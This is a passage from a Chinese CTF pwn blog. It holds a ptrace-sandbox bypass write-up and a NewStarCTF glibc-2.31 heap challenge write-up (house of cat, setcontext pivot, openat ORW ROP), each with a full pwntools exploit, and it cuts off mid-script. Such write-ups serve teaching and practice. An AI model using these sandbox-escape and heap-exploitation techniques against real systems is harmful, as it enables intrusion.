waitpid(v4, 0LL, 0) != -1<br>         &amp;&amp; (v10 != 10000 &amp;&amp; v10 != -1 || ptrace(PTRACE_POKEUSER, v4, 80<span class="hljs-class">LL) != -1) );</span><br></code></pre></td></tr></table></figure><ol><li>循环开头处的 ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)、waitpid(v4, 0LL, 0)是等待子进程进入系统调用；</li><li>中间的代码就是获取当前的系统调用号（rax），过滤一些系统调用；</li><li>循环结尾处的 ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)、waitpid(v4, 0LL, 0)是等待子进程离开系统调用。</li></ol><p>使用<code>int 3</code>这个软中断后，可以让父进程循环开头处的 ptrace误以为子进程已经进入系统调用，但实际上子进程并未进入系统调用；当子进程真正进入系统调用后，是触发循环结尾处的 ptrace， 事实上ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)并不能判断子进程是进入系统调用还是离开系统调用，这样就绕过了中间对系统调用的过滤。</p><p>使用int 3后：</p><ol><li>循环结尾处的 ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)、waitpid(v4, 0LL, 0)是等待子进程进入系统调用；</li><li>循环开头处的 ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)、waitpid(v4, 0LL, 0)是等待子进程离开系统调用。</li></ol><p>相当于反转了循环，之后就可以顺利执行接下来的shellcode了。</p><p>完整的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;sandboxheap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>p = process([<span class="hljs-string">&#x27;./sandbox&#x27;</span>,<span class="hljs-string">&#x27;./sandboxheap&#x27;</span>])<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">pay</span>):<br>    l = <span class="hljs-built_in">len</span>(pay)<br>    pay = <span class="hljs-built_in">int</span>.from_bytes(pay, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        a = pay &amp; <span class="hljs-number">0xff</span><br>        <span class="hljs-comment">#print(hex(a))</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            b = <span class="hljs-number">1</span> &lt;&lt; i<br>            <span class="hljs-keyword">if</span> b &amp; a == <span class="hljs-number">0</span>:<br>                result += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>            <span class="hljs-keyword">else</span> :<br>                result += <span class="hljs-string">b&#x27;\x31&#x27;</span><br>        pay = pay &gt;&gt; <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    add(i, <span class="hljs-number">0xb0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0xb8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    delete(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x80</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x18</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x80</span> + key(p64(<span class="hljs-number">0xc0</span>)) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>, payload)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br><br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-comment">#print(hex(libcbase))</span><br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>syscall_ret = libcbase + <span class="hljs-number">0xd2625</span><br>pop_rdi = libcbase + <span class="hljs-number">0x2164f</span><br>pop_rsi = libcbase + <span class="hljs-number">0x23a6a</span><br>pop_rdx = libcbase + <span class="hljs-number">0x1b96</span><br>pop_rax = libcbase + <span class="hljs-number">0x1b500</span><br>ret = libcbase + <span class="hljs-number">0x8aa</span><br><br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x820</span><br><br>payload = key(p64(free_hook))<br>edit(<span class="hljs-number">2</span>, payload)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x200</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x200</span>)<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0xa0</span> + p64(heap_addr + <span class="hljs-number">0x1140</span> + <span class="hljs-number">0x100</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(pop_rdi) + p64(heap_addr + <span class="hljs-number">0x1000</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx) + p64(<span class="hljs-number">7</span>) + p64(mprotect)<br>payload += p64(heap_addr + <span class="hljs-number">0x1350</span>)<br>edit(<span class="hljs-number">4</span>, key(payload))<br><br>shellcode = <span class="hljs-string">&#x27;int 3&#x27;</span> + shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-number">3</span>, heap_addr, <span class="hljs-number">0x30</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>, heap_addr, <span class="hljs-number">0x30</span>)<br>shellcode = asm(shellcode)<br>edit(<span class="hljs-number">5</span>, key(shellcode))<br><br>edit(<span class="hljs-number">3</span>, key(p64(setcontext + <span class="hljs-number">53</span>)))<br>p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>).encode())<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ctftime上关于Sandybox的wp：<a href="https://ctftime.org/writeup/20115">https://ctftime.org/writeup/20115</a></p><p>实际上ptrace函数还有其它更多的功能，具体请看：<a href="https://www.anquanke.com/post/id/231078">https://www.anquanke.com/post/id/231078</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 公开赛Week4 pwn 这是堆🐎</title>
    <link href="/2022/11/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9BWeek4-pwn-%E8%BF%99%E6%98%AF%E5%A0%86/"/>
    <url>/2022/11/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9BWeek4-pwn-%E8%BF%99%E6%98%AF%E5%A0%86/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF 公开赛Week4 pwn 这是堆🐎</p><p>题目环境：glibc-2.31</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先看到题目调用了prctl函数，说明开了沙盒保护机制。使用seccomp-tools检查一下</p><img src="/img/2/1667357666548.png" style="zoom: 80%;" /><p>发现题目禁止了execve的系统调用，我们很容易想到要用orw将flag读取出来；但这题还把open函数给禁用了（是不是很无语），这里我们可以系统调用openat函数去打开文件，openat函数的系统调用号为257。 </p><p>​                                                                                                     </p><p>Add函数申请堆块，Dele函数和Show函数就一句简单的puts输出。</p><p>再去看看Edit函数，对v1采用int类型去定义的，没有对负数进行检查，我们就可以利用这一点去修改除堆以外的其它地方。</p><p><img src="/img/2/1667357538953.png"></p><p>进一步查看运行时全局变量heaps在bss段的数据，发现存在IO_FILE的地址，可以输入负数然后直接修改_IO_FILE当中的值。</p><img src="/img/2/1667359698418.png" style="zoom: 80%;" /><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>可以使用shellcode去执行orw将flag读取出来，当然前提是泄漏堆地址，然后使用mprotect函数更改堆地址的执行权限，由于程序最初并没有给确定地址的可执行段，所以需要劫持rsp寄存器先执行mprotect函数的ROP，才能进一步去调用shellcode；或者直接劫持rsp寄存器使用open、read、write函数的ROP来实现orw。这里我采用后者。</p><p>程序中的gadget肯定是不够我们去实现ROP的，我们就使用libc中的gadget。</p><p>要控制rsp才可以去ROP，libc中可以去执行setcontext中的代码控制rsp（具体见我的Dest0g3 520迎新赛 pwn ez_kiwi这篇文章）。</p><p>我们可以去修改_IO_FILE当中的值，就想办法劫持其中的控制流，来执行setcontext。</p><h3 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h3><h5 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h5><p>这里我们就去修改标准输出<code>_IO_2_1_stdout_</code>中的值首先泄漏libc的基址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br></code></pre></td></tr></table></figure><p>然后使用ROPgadget 找到相应的gadget，<code>syscall ret</code>这个geaget可以使用操作码去寻找（如下）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROPgadget <span class="hljs-attr">--binary</span> libc-<span class="hljs-number">2.31</span><span class="hljs-selector-class">.so</span> <span class="hljs-attr">--opcode</span> <span class="hljs-string">&quot;0f05c3&quot;</span><br></code></pre></td></tr></table></figure><p>我们还要寻找：</p><p><code>0x0000000000151990 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code></p><p>setcontext中劫持rsp是通过rdx来修改的，但是在puts函数的调用中我们无法去控制rdx；使用这个gadget（它是getkeyserv_handle函数其中的一段），为我们劫持控制流提供了很好的帮助。</p><h5 id="泄漏堆地址"><a href="#泄漏堆地址" class="headerlink" title="泄漏堆地址"></a>泄漏堆地址</h5><p>存放gadget，堆是一个很好的选择，在libc中mp结构就存放了堆地址，我们就采用相同的方式去泄漏堆地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp))<br>heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br></code></pre></td></tr></table></figure><h5 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h5><p>执行puts函数，会通过找到<code>_IO_2_1_stdout_</code>的<code>_IO_file_jumps</code>中的偏移，去执行<code>_IO_file_xsputn</code>函数，我们就需要修改<code>_IO_2_1_stdout_</code>的<code>_IO_file_jumps</code>，  让其最终执行其它函数。<code>_IO_file_jumps</code> 并不能改成任意地址，在调用过程中会对其地址进行检查。</p><p>这里我采用house of cat</p><p>让其调用<code>_IO_wfile_jumps</code>中的<code>_IO_wfile_seekoff</code>函数，然后进入到<code>_IO_switch_to_wget_mode</code>函数去执行如下代码（简写）：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">4</span>&gt;     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">0xa0</span>]<br><span class="hljs-number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">15</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x20</span>]<br><span class="hljs-number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">25</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0xe0</span>]<br><span class="hljs-number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">37</span>&gt;    <span class="hljs-keyword">call</span>   <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x18</span>]<br></code></pre></td></tr></table></figure><p>劫持到_IO_wfile_jumps（如下图）</p><img src="/img/2/1667369851498.png" style="zoom: 67%;" /><p>_IO_switch_to_wget_mode函数中具体实现（如下图）</p><img src="/img/2/1667370258241.png" style="zoom: 67%;" /><p>在这过程中rdi寄存器始终是<code>_IO_2_1_stdout_</code>的地址， 让其最后执行：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">8</span>] <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>], <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">call</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span> + <span class="hljs-number">0x20</span>]<br></code></pre></td></tr></table></figure><p>通过rdi的值去控制rdx，并去执行我们指定的函数，这里我们是去执行setcontext 劫持rsp寄存器指向堆地址。</p><p>改写<code>_IO_2_1_stdout_</code>构造如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE += p64(magic_gadget)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br></code></pre></td></tr></table></figure><h5 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h5><p>写入堆中的数据要注意setcontext的执行 与orw中gadget的位置，具体构造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">orw = p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(pop_rax) + p64(<span class="hljs-number">257</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br><br>payload = <span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0xc0</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += orw<br></code></pre></td></tr></table></figure><p>完整的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25381</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Any data?&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>IO_2_1_stdout = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>IO_wfile_jumps = libcbase + <span class="hljs-number">0x1e8de0</span><br>magic_gadget = libcbase + <span class="hljs-number">0x151990</span><br><span class="hljs-comment">#mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br>pop_rdi = libcbase + <span class="hljs-number">0x23b6a</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + 